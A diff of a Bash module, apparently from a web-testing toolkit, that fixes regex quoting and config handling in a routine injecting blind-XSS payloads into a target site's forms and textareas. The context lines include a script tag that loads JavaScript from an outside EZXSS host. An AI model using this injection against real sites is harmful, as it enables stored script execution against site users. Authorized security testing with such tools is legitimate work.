@@ -137,7 +137,7 @@ _inject_forms() {
   # Identificar campos del formulario
   while IFS= read -r INPUT_TAG; do
     local FIELD_NAME
-    FIELD_NAME=$(echo "$INPUT_TAG" | grep -oiP 'name=["\'][^"\']+["\']' | \
+    FIELD_NAME=$(echo "$INPUT_TAG" | grep -oiP "name=[\"'][^\"']+[\"']" | \
       sed "s/name=[\"']//;s/[\"']//" | head -1 | tr '[:upper:]' '[:lower:]')
     [[ -z "$FIELD_NAME" ]] && continue
 
@@ -157,7 +157,7 @@ _inject_forms() {
 
     # Extraer action del form
     local FORM_ACTION
-    FORM_ACTION=$(echo "$HTML" | grep -oiP '(?<=action=["\'])[^"\']+' | head -1)
+    FORM_ACTION=$(echo "$HTML" | grep -oiP "(?<=action=[\"'])[^\"']+" | head -1)
     [[ -z "$FORM_ACTION" ]] && FORM_ACTION="$URL"
     echo "$FORM_ACTION" | grep -qP '^https?' || \
       FORM_ACTION="$(echo "$URL" | grep -oP 'https?://[^/]+')"
@@ -183,7 +183,7 @@ _inject_forms() {
   # También textareas (comentarios, mensajes)
   while IFS= read -r TA_TAG; do
     local TA_NAME
-    TA_NAME=$(echo "$TA_TAG" | grep -oiP 'name=["\'][^"\']+["\']' | \
+    TA_NAME=$(echo "$TA_TAG" | grep -oiP "name=[\"'][^\"']+[\"']" | \
       sed "s/name=[\"']//;s/[\"']//" | head -1 | tr '[:upper:]' '[:lower:]')
     [[ -z "$TA_NAME" ]] && continue
 
@@ -199,7 +199,7 @@ _inject_forms() {
     local PAYLOAD="<script src=\"https://${EZXSS_DOMAIN}/${PAYLOAD_ID}.js\"></script>"
 
     local FORM_ACTION
-    FORM_ACTION=$(echo "$HTML" | grep -oiP '(?<=action=["\'])[^"\']+' | head -1)
+    FORM_ACTION=$(echo "$HTML" | grep -oiP "(?<=action=[\"'])[^\"']+" | head -1)
     [[ -z "$FORM_ACTION" ]] && FORM_ACTION="$URL"
     echo "$FORM_ACTION" | grep -qP '^https?' || \
       FORM_ACTION="$(echo "$URL" | grep -oP 'https?://[^/]+')"
@@ -330,7 +330,10 @@ module_run() {
 
   log_phase "Módulo 27 — $MODULE_DESC: $DOMAIN"
 
-  _blindxss_check_config || return
+  if ! _blindxss_check_config; then
+    log_ok "$MODULE_DESC saltado — EZXSS no configurado"
+    return 0
+  fi
 
   source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
   proxy_check
